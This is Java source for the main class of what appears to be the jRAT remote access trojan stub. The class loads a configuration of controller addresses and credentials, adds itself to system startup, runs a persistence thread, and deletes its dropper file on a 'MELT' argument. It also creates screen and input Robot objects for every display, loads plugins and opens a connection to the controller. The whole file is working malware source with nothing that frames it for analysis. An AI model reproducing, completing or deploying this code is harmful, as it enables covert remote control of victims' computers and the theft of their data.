package io.jrat.stub;

import io.jrat.common.OperatingSystem;
import io.jrat.common.crypto.Crypto;
import io.jrat.stub.modules.startup.StartupModules;
import io.jrat.stub.utils.Utils;

import java.awt.GraphicsDevice;
import java.awt.GraphicsEnvironment;
import java.awt.Robot;
import java.awt.SystemTray;
import java.awt.TrayIcon;
import java.io.File;
import java.security.KeyPair;
import java.security.KeyPairGenerator;
import java.security.PrivateKey;
import java.security.PublicKey;
import java.util.Date;

import javax.swing.ImageIcon;

public class Main {

	public static String[] addresses;
	public static String id;
	public static String pass;
	public static long reconnectSeconds;
	public static String name;
	public static boolean running = true;
	public static String date;
	public static int timeout;
	public static boolean errorLogging = false;
	public static boolean debugMessages = true;
	public static TrayIcon icon;

	
	public static byte[] aesKey;
	public static KeyPair rsaPair;
	
	public static Robot robot;
	
	public static Robot[] robots;

	public static boolean encryption = true;

	public static void main(String[] args) {
		try {
			StartupModules.execute(Configuration.getConfig());

			robot = new Robot();

			File filetodelete = null;

			addresses = Configuration.getConfig().get("addresses").split(",");
			id = Configuration.getConfig().get("id");
			pass = Configuration.getConfig().get("pass");
			reconnectSeconds = Long.parseLong(Configuration.getConfig().get("reconsec"));
			name = Configuration.getConfig().get("name");
			errorLogging = Boolean.parseBoolean(Configuration.getConfig().get("error"));
			debugMessages = Boolean.parseBoolean(Configuration.getConfig().get("debugmsg"));

			if (Boolean.parseBoolean(Configuration.getConfig().get("mutex"))) {
				new Mutex(Integer.parseInt(Configuration.getConfig().get("mport"))).start();
			}

			

			if (Boolean.parseBoolean(Configuration.getConfig().get("timeout"))) {
				timeout = Integer.parseInt(Configuration.getConfig().get("toms"));
			} else {
				timeout = 1000 * 15;
			}

			if (args.length > 0) {
				if (args[0].trim().equals("MELT")) {
					String path = args[1];
					filetodelete = new File(path.replace("\"", "").trim());
				}
			}

			String currentJar = Utils.getJarFile().getAbsolutePath();

			try {
				Startup.addToStartup(name);
			} catch (Exception e) {
				e.printStackTrace();
			}

			if (filetodelete != null) {
				while (filetodelete.exists()) {
					try {
						filetodelete.delete();
					} catch (Exception ex) {
						try {
							Thread.sleep(1000L);
						} finally {
						}
					}
				}
			}

			if (OperatingSystem.getOperatingSystem() == OperatingSystem.WINDOWS && currentJar.startsWith("/")) {
				currentJar = currentJar.substring(1, currentJar.length());
			}

			File f = new File(currentJar);
			if (f.exists()) {
				Date da = new Date(f.lastModified());
				Main.date = da.toString();
			}

			try {
				Plugin.load();
			} catch (Exception e1) {
				e1.printStackTrace();
			}

			if (Boolean.parseBoolean(Configuration.getConfig().get("ti"))) {
				if (SystemTray.isSupported()) {
					try {
						SystemTray tray = SystemTray.getSystemTray();
						icon = new TrayIcon(new ImageIcon(Main.class.getResource("/icon.png")).getImage(), Configuration.getConfig().get("tititle"), null);
						tray.add(icon);
					} catch (Exception e) {
						e.printStackTrace();
					}
				}
			}

			if (Boolean.parseBoolean(Configuration.getConfig().get("per"))) {
				new Persistance(Integer.parseInt(Configuration.getConfig().get("perms"))).start();
			}

			GraphicsDevice[] devices = GraphicsEnvironment.getLocalGraphicsEnvironment().getScreenDevices();
			robots = new Robot[devices.length];
			for (int i = 0; i < devices.length; i++) {
				robots[i] = new Robot(devices[i]);
			}

			for (Plugin plugin : Plugin.list) {
				plugin.methods.get("onstart").invoke(plugin.instance, new Object[] {});
			}

			new Thread(new Connection()).start();
		} catch (Exception ex) {
			ex.printStackTrace();
		}

	}

	public static String getPass() {
		return pass;
	}

	public static String[] getAddresses() {
		return addresses;
	}

	public static String getID() {
		return id;
	}

	public static byte[] getKey() {
		return aesKey;
	}

	public static String debug(Object s) {
		if (!debugMessages) {
			return null;
		}
		if (s == null) {
			s = "null";
		}
		System.out.println(s.toString());
		return s.toString();
	}

	public static KeyPair getKeyPair() throws Exception {
		if (rsaPair == null) {
			KeyPairGenerator kpg = KeyPairGenerator.getInstance("RSA");
			kpg.initialize(Crypto.RSA_SIZE);
			KeyPair kp = kpg.genKeyPair();
			PublicKey publicKey = kp.getPublic();
			PrivateKey privateKey = kp.getPrivate();

			rsaPair = new KeyPair(publicKey, privateKey);
		}

		return rsaPair;
	}

}
